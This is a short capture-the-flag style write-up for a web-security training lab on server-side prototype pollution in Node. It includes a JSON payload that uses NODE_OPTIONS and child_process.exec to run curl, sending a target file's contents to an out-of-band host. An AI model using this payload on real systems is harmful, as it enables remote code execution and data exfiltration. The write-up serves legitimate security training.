# Lab 10 — Remote code execution via server-side prototype pollution

> **Expert** · [Official lab](https://portswigger.net/web-security/prototype-pollution/server-side/lab-remote-code-execution-via-server-side-prototype-pollution)

**Entry point:** the command sink fires only when an **admin** triggers the

> **Burp Community alternative (free):** Collaborator is Pro-only. Use a free out-of-band service instead — [interact.sh](https://interact.sh) or [canarytokens.org](https://canarytokens.org) (DNS + HTTP). Substitute its domain wherever this write-up says Collaborator/Collaborator payload.
maintenance jobs — combine pollution options for full RCE.

## Solution

1. Confirm pollution (`json spaces`), then pollute the `child_process.exec`
   environment via `NODE_OPTIONS` so the spawned Node process requires an
   attacker-controlled/leaked file:

```json
"__proto__": {
  "NODE_OPTIONS": "--require /proc/self/environ",
  "xyz": "require('child_process').exec('curl https://YOUR-COLLABORATOR-SUBDOMAIN?leak='+require('fs').readFileSync('/home/carlos/flag'))//"
}
```

(The `NODE_OPTIONS --require` trick loads the environment/command line as a
JS module; adjust to leak the target file.)

2. As administrator, trigger the maintenance jobs (use lab 09's
   `isAdmin:true` pollution first if needed).
3. Collaborator receives the exfiltrated data — submit it — lab solved.

## Notes

Node reads `NODE_OPTIONS` from the environment of spawned children —
prototype-polluted properties frequently reach `env` there.
